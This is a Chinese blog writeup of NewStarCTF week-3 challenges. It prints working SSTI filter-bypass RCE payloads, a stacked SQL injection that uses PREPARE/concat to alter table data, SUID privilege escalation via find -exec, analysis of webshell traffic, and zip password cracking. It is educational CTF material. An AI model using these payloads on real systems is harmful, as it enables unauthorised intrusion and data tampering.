@@ -1,0 +1,449 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta name="referrer" content="no-referrer"><title>NewStarCTF 公开赛第三周Writeup | Anyyy安全小站</title><meta name="keywords" content="刷题,CTF"><meta name="author" content="Anyyy"><meta name="copyright" content="Anyyy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言PS：后面题目做出来的比较少，其它方向的题解可以参考网上别的师傅写的wp。misc写的很详细，各位师傅们可以看看 第三周解题情况： 国庆没做题 光顾着玩了。8号那天回学校做的题 貌似就做了一天，还可以&#x3D; &#x3D; WebWeb1.BabySSTI_Onessti类型的第一题，要求我们传参name，先传入&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;发现解析 尝试构造’’.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NewStarCTF 公开赛第三周Writeup">
+<meta property="og:url" content="http://www.anyiblog.top/2022/10/20/20221020/index.html">
+<meta property="og:site_name" content="Anyyy安全小站">
+<meta property="og:description" content="前言PS：后面题目做出来的比较少，其它方向的题解可以参考网上别的师傅写的wp。misc写的很详细，各位师傅们可以看看 第三周解题情况： 国庆没做题 光顾着玩了。8号那天回学校做的题 貌似就做了一天，还可以&#x3D; &#x3D; WebWeb1.BabySSTI_Onessti类型的第一题，要求我们传参name，先传入&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;发现解析 尝试构造’’.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.anyiblog.top/common/6EE5B4DA1158A8922B7B29B21381BECF.jpg">
+<meta property="article:published_time" content="2022-10-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-05-07T07:36:01.024Z">
+<meta property="article:author" content="Anyyy">
+<meta property="article:tag" content="刷题">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.anyiblog.top/common/6EE5B4DA1158A8922B7B29B21381BECF.jpg"><link rel="shortcut icon" href="http://cdn.anyiblog.top/img/favicon.png"><link rel="canonical" href="http://www.anyiblog.top/2022/10/20/20221020/"><link rel="preconnect" href="//fastly.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.json","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  source: {
+    justifiedGallery: {
+      js: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'NewStarCTF 公开赛第三周Writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-07 15:36:01'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><div class="aplayer" data-id="7356458861" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://fastly.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js"></script><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/css/flink.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/css/hideCategory.min.css"><script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script><script src="/js/sweetalert.js"></script><link rel="stylesheet" href="/css/sweetalert.css"><!-- 仅首页弹窗通知 welcome--><!--link(rel="stylesheet" href="APlayer.min.css")--><div id="aplayer"></div><script src="http://cdn.anyiblog.top/js/Meting.min2.js" async></script><script src="http://cdn.anyiblog.top/js/Meting.min2.js" async></script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://cdn.anyiblog.top/img/avatar.jpg" onerror="onerror=null;src='http://cdn.anyiblog.top/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div><div class="menus_item"><a class="site-page" href="/inform/"><i class="fa-fw fa-fw fa fa-coffee"></i><span> 通知</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Anyyy安全小站</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div><div class="menus_item"><a class="site-page" href="/inform/"><i class="fa-fw fa-fw fa fa-coffee"></i><span> 通知</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">NewStarCTF 公开赛第三周Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-19T16:00:00.000Z" title="发表于 2022-10-20 00:00:00">2022-10-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-07T07:36:01.024Z" title="更新于 2023-05-07 15:36:01">2023-05-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="NewStarCTF 公开赛第三周Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>PS：后面题目做出来的比较少，其它方向的题解可以参考网上别的师傅写的wp。misc写的很详细，各位师傅们可以看看</p>
+<p>第三周解题情况：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263095548-110582df-297e-4320-8472-0345fed0f751.jpg">国庆没做题 光顾着玩了。8号那天回学校做的题 貌似就做了一天，还可以&#x3D; &#x3D;</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="Web1-BabySSTI-One"><a href="#Web1-BabySSTI-One" class="headerlink" title="Web1.BabySSTI_One"></a>Web1.BabySSTI_One</h3><p>ssti类型的第一题，要求我们传参name，先传入<code>&#123;&#123;7*7&#125;&#125;</code>发现解析</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263096555-927ed295-0bcc-400f-8b75-21a6be5c3862.jpg">尝试构造’’.__class__.__base__.__subclasses来引用os函数，但是发现关键词class、base这些被ban了</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263096945-0e060243-bb47-4c1d-a3e7-8cfa486dd64d.jpg"><br>绕过方法是用+号拼接”__cla”+”ss__“这样，然后每个类用[]包括起来</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;__cla&quot;+&quot;ss__&quot;][&quot;__ba&quot;+&quot;se__&quot;][&quot;__subc&quot;+&quot;lasses__&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263097317-9ec2452c-35e3-4484-8b60-068529cc0975.jpg"><br>这样的情况是因为类被网页解析了导致不显示，我们可以ctrl+u打开源代码看有哪些类</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263097700-248f5cd6-bdda-4214-9ded-28e19e71fcf1.jpg"><br>os在第117个类，引用os并构造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;__in&quot;+&quot;it__&quot;][&quot;__glo&quot;+&quot;bals__&quot;][&#x27;popen&#x27;](&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure>
+<p>，通过引用os模块的popen函数来RCE</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263098052-2e8cd58e-5787-4140-9895-c11c23601c46.jpg"><br>成功命令执行，用ls &#x2F;看下flag在哪</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263098440-8f728e11-48ca-4a0d-af4b-515222dfc7ee.jpg"><br>尝试输入cat &#x2F;flag_in_here</p>
+<p>然后发现cat和flag都被关键词过滤了</p>
+<p>绕过的姿势就是用tac和*号匹配：tac &#x2F;fla*</p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;[&quot;__cla&quot;+&quot;ss__&quot;][&quot;__ba&quot;+&quot;se__&quot;][&quot;__subc&quot;+&quot;lasses__&quot;]()[117][&quot;__in&quot;+&quot;it__&quot;][&quot;__glo&quot;+&quot;bals__&quot;][&#x27;popen&#x27;](&#x27;tac /fla*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263098840-6601bcc6-23a4-457b-9f74-d46f7863cb1d.jpg">  </p>
+<h3 id="Web2-multiSQL"><a href="#Web2-multiSQL" class="headerlink" title="Web2.multiSQL"></a>Web2.multiSQL</h3><p><img src="http://cdn.anyiblog.top/common/1666263099216-41e728eb-545a-4a4f-a38a-a876817348cd.jpg"><br>题目查询点存在堆叠注入，要求我们分数达到425分以上，满足条件后访问verify.php即可获得flag</p>
+<p>因此我们需要用到update函数来改某个表的某个字段为425以上，再访问就可以得到flag</p>
+<p>因为select被过滤了，可以先用show这个查数据库，表，字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查库：1&#x27;; show databases;#</span><br><span class="line">&gt;</span><br><span class="line">english</span><br><span class="line">information_schema</span><br><span class="line">mysql</span><br><span class="line">performance_schema</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查表：1&#x27;;show tables from english#</span><br><span class="line">&gt;</span><br><span class="line">score</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查字段：1&#x27;;show columns from score;#</span><br><span class="line">&gt;</span><br><span class="line">username  varchar(255)  YES</span><br><span class="line">listen  int(11)  YES</span><br><span class="line">read  int(11)  YES</span><br><span class="line">write  int(11)  YES</span><br></pre></td></tr></table></figure>
+<p>显然是要修改english.score字段listen为425以上，我们可以用update创建个用户和其分数</p>
+<p>但很不幸update被禁用了，所以这里要用预处理命令绕过，</p>
+<p>可以参考强网杯2019随便注这道题，wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45552960/article/details/103608740">https://blog.csdn.net/qq_45552960&#x2F;article&#x2F;details&#x2F;103608740</a></p>
+<p>用concat拼接字段从而绕过update的判断，最后执行存储的sql语句篡改表中数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">  </span><br><span class="line">SET @sql = concat(&quot;u&quot;,&quot;pdate score set username=&#x27;1&#x27;, listen=&#x27;1000&#x27;&quot;);  //存储SQL语句</span><br><span class="line">  </span><br><span class="line">PREPARE sqla from @sql;   //预定义SQL语句</span><br><span class="line">  </span><br><span class="line">EXECUTE sqla;#  //执行预定义SQL语句</span><br><span class="line">  </span><br><span class="line">//1&#x27;;SET @sql = concat(&quot;u&quot;,&quot;pdate score set username=&#x27;1&#x27;, listen=&#x27;1000&#x27;&quot;);PREPARE sqla from @sql;EXECUTE sqla;#</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263099636-52eefb21-7049-49e9-9bf6-31b95cb407b9.jpg"><br><img src="http://cdn.anyiblog.top/common/1666263099994-f11aa18e-39c8-47ba-ad56-a02753f57451.jpg"><br>Flag：flag{Ju3t_use_mo2e_t2en_0ne_SQL}</p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="Misc1-Whats-HTTP"><a href="#Misc1-Whats-HTTP" class="headerlink" title="Misc1.Whats HTTP"></a>Misc1.Whats HTTP</h3><p>http流量包，wireshark打开分析</p>
+<p>你可以直接导出http包到本地，然后本地分析，也可以wireshark筛选条件分析</p>
+<p>这里我是用wireshark筛选出来的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.response.code==200  //筛选状态码为200的包</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263100398-a730dd4a-c496-4288-899e-6c961a43cbce.jpg"><br>这个包字节比较特殊 和别的不同，追踪下这个流</p>
+<p>一追踪下 flag这不就来了吗</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263100822-cf0bfb62-0abc-4954-880f-bd3c6810193d.jpg"><br>base64解密下</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263101216-b16d306d-ec3c-49b4-8340-630dd7eebfb8.jpg"><br>666c61这个前缀显然是flag，所以最后16进制转换下字符串即可</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263101587-97dc0ceb-12ba-4c8b-867f-be68cbc4cf94.jpg"><br>复现的时候一把梭做出来的，之前咋做的忘记了呃呃</p>
+<p>Flag：flag{4f33649d030c6778426971b54dd72ece}</p>
+<h3 id="Misc2-qsdz’s-girlfriend-3"><a href="#Misc2-qsdz’s-girlfriend-3" class="headerlink" title="Misc2.qsdz’s girlfriend 3"></a>Misc2.qsdz’s girlfriend 3</h3><p>一个提权的题目，题目提示：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263101940-a0b78dc7-81f5-482f-934f-44895d08389c.jpg">  </p>
+<p>ssh连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -p 29142 qsdz@node4.buuoj.cn</span><br><span class="line">  </span><br><span class="line">&gt;qsdz@node4.buuoj.cn&#x27;s password: Hikari</span><br></pre></td></tr></table></figure>
+<p>成功连接：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263102313-013afb9f-38bc-48da-aebf-aa2e8efc3aca.jpg"><br>在&#x2F;home&#x2F;a2u2e发现了重要信息</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263103369-b7c51f83-4ab4-4e89-aea4-c07433c4c41d.jpg"><br>（日记看哭了）</p>
+<p>显然flag就在&#x2F;root&#x2F;girlfriends&#x2F;Hikari</p>
+<p>现在没有权限进入root，要想办法提权</p>
+<p>说实话提示给的网站都没用上，根本不知道咋用。。hh</p>
+<p>我是用find suid提权，先在&#x2F;tmp文件夹下创建一个1文件</p>
+<p>然后find 1 -exec [cmd] \;即可</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263103708-8cd4e354-9b94-4fc0-b933-ce9b62860e33.jpg"><br>可以看到现在为root权限了，flag在哪我们也知道了，之后就找文件就完事了</p>
+<p>注意下这个-exec后面的命令不需要用引号包含 直接打就星</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263104030-d4e9c872-f984-44f1-afef-c5597e623941.jpg"><br>蚌埠住了！出题人我以后再也不乱说话了哈哈哈哈哈哈 我服啦</p>
+<p>最后cat下这个文件得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find 111 -exec cat /root/girlfriends/hasegawa_azusa \;</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263104382-98cfb0aa-6bad-499b-ab83-041354efb4dc.jpg">  </p>
+<h3 id="Misc3-WebShell！"><a href="#Misc3-WebShell！" class="headerlink" title="Misc3.WebShell！"></a>Misc3.WebShell！</h3><p><img src="http://cdn.anyiblog.top/common/1666263104756-e2f7b5f4-229b-4842-83b1-25a6e10b167c.jpg">  </p>
+<p>蚁剑流量分析，wireshark分析，要求获取webshell密码 用户名和文件内容</p>
+<p>同样http.response.code&#x3D;&#x3D;200筛选，然后逐个分析</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263105217-d10fd2d2-d426-4d9f-8349-c405a9999cb7.jpg"><br>追踪第一个包，发现了webshell的内容</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263105668-b311517a-434a-4967-b84a-b808100cbd44.jpg">  </p>
+<p>一个php函数highlight_file的样式，可以写进html看内容。但其实分析其中内容也可以看出密码了</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263105992-99b189b8-c8f9-4416-86a9-cac479a05349.jpg">  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell密码：n3wst4r</span><br></pre></td></tr></table></figure>
+<p>有了这个密码字符串那我们溯源都变得简单多了</p>
+<p>要先想蚁剑连接都围绕eval($_POST[‘n3wst4r’])这个webshell进行，那么就有两个特征：</p>
+<p>http字符串包含n3wst4r；请求方法为post</p>
+<p>所以我们构造这个筛选条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;n3wst4r&quot; and http.request.method==POST</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263106441-e0731e60-ca61-40b4-8d09-46ca91824f51.jpg"><br>逐个分析即可，注意由于我们筛选的是post包，仅仅只是一个请求，只能显示其请求的参数</p>
+<p>那么请求的回显在哪里？就需要我们追踪tcp流找这个包紧跟着的http包，那就是回显内容</p>
+<p>比如这里我追踪第4个包（前3个包字节都只有2k多，后面的都是5k多显然后面的包是执行了命令的，所以前面可以不用看）</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263106877-c3e7e986-da52-416f-ad11-f88b8f44104b.jpg"><br>然后在这个流下找到了http包，打开line-based text data找到了内容</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263107278-1856e977-d4f3-4a9a-b9fa-556c189ee580.jpg">  </p>
+<p><img src="http://cdn.anyiblog.top/common/1666263107798-5955d92a-eb43-4e14-97c2-cb4b7aadaf38.jpg"><br>看回显内容就知道执行了ls命令，用这种方法可以直接找到命令 比较快。当然如果你逐个分析蚁剑流量的参数，各种加解密后还原了命令的内容也可以。</p>
+<p>不过题目是让我们找用户名和机密文件的内容，那就在剩下几个包里找回显就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第5个包找到用户名为：www-data</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263108262-e99ae075-24b1-461a-96fd-eaa76892f74a.jpg">  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第9个包找到文件内容为：Y0UAr3G00D</span><br></pre></td></tr></table></figure>
+<p><img src="http://cdn.anyiblog.top/common/1666263108743-87b4dd2a-6ad1-43ea-99b7-6de0aeb34d81.jpg"><br>最后拼接下得到flag</p>
+<p>Flag：flag{n3wst4r_www-data_Y0UAr3G00D}</p>
+<h3 id="Misc4-Yesec-no-drumsticks-3"><a href="#Misc4-Yesec-no-drumsticks-3" class="headerlink" title="Misc4.Yesec no drumsticks 3"></a>Misc4.Yesec no drumsticks 3</h3><p>题目提示：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263109114-cfdeb215-3c51-4863-8076-bf0a949e8b8a.jpg"><br><img src="http://cdn.anyiblog.top/common/1666263109511-658661d7-4cda-4c27-bb47-0d029abeae94.jpg"><br>一个压缩包题，有三道 做任意一道就行，这边我做的是第三道 其它两道没有做</p>
+<p><strong>Third：</strong></p>
+<p>解压得到guna.zip。</p>
+<p><strong>第一层：</strong></p>
+<p>打开压缩包：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263109944-55be6348-5786-4d0c-82a1-6f8b02abe59d.jpg"><br>注释告诉我们弱密码，那么直接爆破下即可。</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263110429-c6969edf-211b-4965-b6a7-55a30ac7d14f.jpg"><br>密码为caiji，解压压缩包得到文本和新的压缩包</p>
+<p>文本内容：</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263110865-8c0a4f29-3966-4fd2-9fcd-908d7c5c3a4d.jpg"><br>没有任何隐写，不过后面有用 先留着</p>
+<p><strong>第二层：</strong></p>
+<p><img src="http://cdn.anyiblog.top/common/1666263111299-19fc7268-590e-4591-97d4-69c274a5cb3f.jpg"><br>注释提示了rockyou，刚开始不知道是什么 百度下发现rockyou是kali自带的字典</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263111619-0a36b3b9-efd9-49b8-b717-0cda0ef77fdf.jpg"><br>copy到本地下，然后用archpr爆破即可</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263112138-5898eddc-ad68-4ad7-956e-41b2cc7ced1d.jpg">  </p>
+<p>得到密码elamordemividaerestu 解压得到下一个压缩包</p>
+<p><strong>第三层：</strong></p>
+<p><img src="http://cdn.anyiblog.top/common/1666263112892-432339dd-5252-42c4-b49f-e9f909edac73.jpg"><br>让我们爆破密码，这里遍历下字母表用python写个字典 然后用archpr爆破</p>
+<p>建议字母表弄个小写和数字就行了 根据后面几位的规律，写多了跑得慢而且卡</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">  </span><br><span class="line">table = string.ascii_lowercase + string.digits</span><br><span class="line">print(table)</span><br><span class="line">l = []</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">for a in table:</span><br><span class="line">    for b in table:</span><br><span class="line">        for c in table:</span><br><span class="line">            for d in table:</span><br><span class="line">                for e in table:</span><br><span class="line">                    password = &#x27;%s%s%s%s%s_1s_sha0O&#x27;%(a,b,c,d,e)</span><br><span class="line">                    l.append(password)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">print(len(l))</span><br><span class="line">with open(&#x27;dc.txt&#x27;,&#x27;w&#x27;) as f:</span><br><span class="line">    for password in l:</span><br><span class="line">        f.write(password + &#x27;\n&#x27;)</span><br></pre></td></tr></table></figure>
+<p>运行后等待一会</p>
+<p><img src="http://cdn.anyiblog.top/common/1666263113292-20857710-021f-4aa2-a5ed-e1fb0ee5b528.jpg"><br><img src="http://cdn.anyiblog.top/common/1666263113739-09b98b54-7352-46a1-8619-3466fcea7ae4.jpg"><br>得到密码yesec_1s_sha0O  (yesec_is_shabi queshi)</p>
+<p><strong>第四层：</strong></p>
+<p><img src="http://cdn.anyiblog.top/common/1666263114205-43225a01-082a-44e6-93a7-23c9f459b52c.jpg"><br>还记得之前的dialogue.txt么，和这个txt CRC相同 大小相同<br><img src="http://cdn.anyiblog.top/common/1666263114718-db3fc086-fa7b-47cc-a9c8-aa9c277a27de.jpg"><br>说明是同个文件，那么使用明文攻击。</p>
+<p>把dialogue.txt压缩到dialogue.zip</p>
+<p>之后archpr攻击类型选择明文，将两个压缩包分别放入</p>
